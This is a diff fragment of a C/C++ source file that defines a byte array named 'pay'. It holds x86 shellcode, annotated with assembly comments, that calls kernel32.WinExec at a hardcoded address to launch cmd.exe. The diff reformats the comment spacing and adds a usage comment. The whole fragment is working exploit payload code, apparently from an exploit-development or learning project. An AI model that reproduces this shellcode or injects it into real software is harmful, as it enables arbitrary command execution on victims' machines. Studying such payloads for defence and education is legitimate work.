@@ -18,15 +18,15 @@ WinExec = (
 */
 
 unsigned char pay[]{
-	0x33, 0xc0,						        // XOR EAX, EAX
-	0x50,							            // PUSH EAX 
+	0x33, 0xc0,			// XOR EAX, EAX
+	0x50,				// PUSH EAX 
 	0x68, 0x2e, 0x65, 0x78, 0x65,	// PUSH ".exe"  
 	0x68, 0x63, 0x6d, 0x64, 0x00,	// PUSH "cmd"  (This didn't work without the nullbyte making up for the missing char)
-	0x8b, 0xc4,						        // MOV EAX, ESP 
-	0x6a, 0x01,						        // PUSH 1 
-	0x50,							            // PUSH EAX
-	0xbb, 0x30, 0xcd, 0x5d, 0x77,	// MOV EBX, kernel32.WinExec 
-	0xff, 0xd3						        // CALL EBX
+	0x8b, 0xc4,			// MOV EAX, ESP 
+	0x6a, 0x01,			// PUSH 1 
+	0x50,				// PUSH EAX
+	0xbb, 0x30, 0xcd, 0x5d, 0x77,	// MOV EBX, kernel32.WinExec || Ex use: WinExec("cmd.exe", 1);
+	0xff, 0xd3			// CALL EBX
 };
 
 /*
